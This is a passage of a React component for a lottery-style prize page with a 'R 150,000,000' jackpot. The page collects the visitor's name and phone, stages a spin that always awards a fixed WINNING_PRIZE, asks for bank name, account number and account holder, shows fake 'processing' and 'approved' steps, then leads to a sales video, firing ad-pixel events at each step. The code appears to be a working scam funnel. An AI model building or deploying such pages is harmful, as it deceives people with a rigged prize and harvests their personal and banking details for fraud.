          prize_rank: selectedPrize?.rank,
          prize_amount: selectedPrize?.label
        }, true);
        break;
      case "processing":
        trackPixelEvent("AddPaymentInfo", {
          bank_name: selectedBank
        });
        break;
      case "approved":
        trackPixelEvent("BankApproved", {
          bank_name: selectedBank
        }, true);
        break;
      case "vsl":
        trackPixelEvent("WatchVideo", {
          content_name: "VSL Page"
        }, true);
        break;
      default:
        break;
    }
  }, [step]);

  function handleAgeConfirm() {
    if (typeof window !== "undefined") {
      localStorage.setItem("ageConfirmed18", "1");
    }
    setIsAgeConfirmed(true);
  }

  return (
    <div className="min-h-screen bg-[#eef3fb] font-sans text-[14px] flex flex-col justify-between">
      <div>
        {!isAgeConfirmed && <AgeVerification onConfirm={handleAgeConfirm} />}
        
        <Header jackpot="R 150,000,000" />
        
        {step === "prizes" && (
          <PrizeSelectionStep 
            name={name}
            phone={phone}
            setName={setName}
            setPhone={setPhone}
            selected={selectedPrize}
            setSelected={setSelectedPrize}
            onNext={() => setStep("spin")}
          />
        )}
        
        {step === "spin" && selectedPrize && (
          <SpinStep 
            name={name}
            prize={selectedPrize}
            onWin={() => setStep("bank")}
          />
        )}
        
        {step === "bank" && (
          <BankStep 
            prize={WINNING_PRIZE}
            bank={selectedBank}
            setBank={setSelectedBank}
            accountNumber={accountNumber}
            setAccountNumber={setAccountNumber}
            accountHolder={accountHolder}
            setAccountHolder={setAccountHolder}
            defaultHolder={name}
            onSubmit={() => setStep("processing")}
          />
        )}
        
        {step === "processing" && (
          <ProcessingStep 
            bank={selectedBank}
            onDone={() => setStep("approved")}
          />
        )}
        
        {step === "approved" && (
          <ApprovedStep 
            bank={selectedBank}
            name={name}
            prize={WINNING_PRIZE}
            onContinue={() => setStep("vsl")}
          />
        )}
        
        {step === "vsl" && (
          <VslStep 
            name={name}
            bank={selectedBank}
            prize={WINNING_PRIZE}
          />
        )}
      </div>

      <Footer />
    </div>
  );
}
